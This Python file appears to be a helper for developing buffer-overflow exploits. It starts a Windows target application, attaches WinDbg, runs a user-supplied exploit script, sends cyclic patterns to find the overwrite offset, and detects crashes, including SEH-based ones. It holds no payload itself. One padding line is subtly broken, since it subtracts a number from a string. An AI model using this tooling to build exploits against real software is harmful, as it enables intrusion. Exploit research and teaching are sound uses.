import sys, os
import time
import pattern
import subprocess
from multiprocessing import Process
import ApplicationHandler

size = ""
inputBuffer = ""
index = 0
exploitDelay = 2

ah = ApplicationHandler.runApplication()



class exploitHandler:

    def runModExploit(mode, exploitDelay):
        time.sleep(exploitDelay)               #Increase time if debugger unable to attach to process. It might be due to app crashing before attached to windbg
        curPath = os.getcwd()
        cmd = "python "+curPath+"\\exploitFiles\\exploit-"+mode+".py"
        #print(cmd)
        #p = subprocess.Popen(cmd)                      # Use this if you want exploit output to be displayed.
        p = subprocess.Popen(cmd,stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        print("Exploit sent!")

    def findIndex(appName):
        
        #print("Finding IP index!")

        startTime = time.time()

        pid=ah.startService(appName)
        Process(target=exploitHandler.runModExploit,args=["findIndex",exploitDelay]).start()
        winDBGcmd = "!py "+os.path.abspath('.')+"\\templates\\findIndex.py;g"
        windbgProc=ah.launchWindbg(pid,winDBGcmd)


        while not os.path.exists('status.txt'):
            if time.time() - startTime > exploitDelay + 5:
                print("Time more than 5 sec! Exploit failed")
                windbgProc.kill()
                return False
            time.sleep(2)

        if os.stat('status.txt').st_size !=0:
            f=open("status.txt",'r')
            index=f.readlines()
            f.close()
        #print(index)

            if index[0]:
                #print('*'*10+'Application crash index obtained at: '+index[0]+'!'+'*'*10)
                print("\t[+]Application index found: "+index[0])
                os.remove("status.txt")
                windbgProc.kill()
                return index[0]
            else:
                print('*'*10+'Index error!'+'*'*10)
                os.remove("status.txt")
                windbgProc.kill()
                return False

    def crash(appName):
        print("[*]Crashing!")

        startTime = time.time()

        pid=ah.startService(appName)
        Process(target=exploitHandler.runModExploit,args=["crash",exploitDelay]).start()
        winDBGcmd = "!py "+os.path.abspath('.')+"\\templates\\crash.py;g"
        windbgProc=ah.launchWindbg(pid,winDBGcmd)


        while not os.path.exists('status.txt'):
            if time.time() - startTime > exploitDelay+5:
                print("Exploit exceeded 5 sec! Exploit failed")
                windbgProc.kill()
                return False
            time.sleep(2)
        if os.stat('status.txt').st_size !=0:
            f=open("status.txt",'r')
            status=f.readlines()
            f.close()
        
        #print(status[0])

        if status[0].strip() == 'True':
            #print('*'*10+'Application crashed successfully for fuzz!'+'*'*10)
            #print("[+]Application crashed on fuzzing!")
            try:
                if status[1]:
                    print("\t[+]SEH based!")
            except:
                pass
                
            os.remove("status.txt")
            windbgProc.kill()
            return True
        else:
            #print("[-]Fuzz crash failed")
            os.remove("status.txt")
            windbgProc.kill()
            return False

    def parseeFile(eFile,mode):
        
        global size
        global inputBuffer
        global index
        

        #print("Parsing eFile: "+eFile)
        #print("Mode: "+mode)

        ecFile = ".\\exploitFiles\\exploit-"+mode+".py"
        #print("EcFile is "+ecFile)

        f2=open(eFile,'r')
        f3=open(ecFile,'w')

        for efline in f2:
            #efline = "    "+efline
            if "index =" in efline:
                index=efline.strip().split('=')[-1]
                index=int(index)
                #f3.write(efline)

            if "size =" in efline:
                size=efline.strip().split('=')[-1]
                if '0x' in size:
                    size = int(size,16)
                else:
                    size=int(size)
                f3.write(efline)
            elif "inputBuffer" in efline and 'size' in efline:
                inputBuffer=efline
                #print("\t[+]Buffer is: "+inputBuffer)
                if mode == "findIndex":
                    inputBuffer=efline.split('=')[0] + "= "
                    if size > 20280:
                        print("\t\t\t\t[!]Size too big only testing first 20280 chars!")
                        s=str(pattern.pattern_gen(20280)).encode('ascii') + str("\x41" * (size)-20280).encode('ascii')
                    else:
                        s=str(pattern.pattern_gen(size)).encode('ascii')
                    inputBuffer+=str(s)
                    inputBuffer+="\r\n"
                    
                f3.write(inputBuffer)
            else:
                f3.write(efline)

        f3.write("\nf=open('exploitStatus.txt','w')\n")
        f3.write("f.write('True')\n")
        f3.write("f.close()\n")

        f3.close()
        f2.close()

        if not (size or inputBuffer): 
                print("[-]Size or inputBuffer not found! Exiting!")
                sys.exit()


    def exploit(appName,mode,eFile,eDelay):

        print("[*]Starting exploit!")
        #Cleant old txt status files!
        curPath = os.listdir(".")
        for item in curPath:
                if item.endswith(".txt"):
                        os.remove(item)
        global exploitDelay 
        global index

        exploitDelay = int(eDelay)
        #print(mode)

        if mode == "crash":
            #print("Crashing!")
            #tempFile = ".\\templates\\crash.py"
            exploitHandler.parseeFile(eFile,mode)
            if exploitHandler.crash(appName):
                print("\t[+]Application crashed successfully!")
            else:
                print("[-]Application crash failed")
        elif mode == "findIndex":
            #global index
            #tempFile = ".\\templates\\findIndex.py"
            failedAttempts = 0
            exploitHandler.parseeFile(eFile,mode)
            print("\t[+]Buffer size is: "+str(size)) 
            while failedAttempts < 3:
                index = exploitHandler.findIndex(appName)
                if index:
                    break
                else:
                    print("\t[-]Attempt no. "+str(failedAttempts)+" failed!")
                    failedAttempts += 1
            if not index:
                print("\t[-]Index not found! Multiple fails!")
            else:
                print("\t[*]Best of luck with that! :)")